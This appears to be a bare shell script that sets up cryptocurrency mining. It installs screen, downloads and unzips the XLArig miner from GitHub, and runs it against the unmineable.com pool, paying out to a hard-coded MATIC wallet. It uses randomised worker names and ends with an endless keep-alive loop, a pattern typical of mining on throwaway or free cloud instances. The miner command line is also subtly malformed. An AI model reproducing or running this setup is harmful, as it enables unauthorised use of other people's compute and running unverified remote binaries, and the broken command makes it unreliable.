sudo apt update
sudo apt install screen -y
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip 
unzip XLArig-v5.2.2-linux-x86_64.zip 
./xlarig -o rx.unmineable.com:3333-a rx/0 -k -u MATIC:0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.$(echo MieGoreng-$(shuf -i 0001-1000 -n 1))+50000#lwmc-bur5
while [ 1 ]; do
sleep 1.2
done
sleep 1294
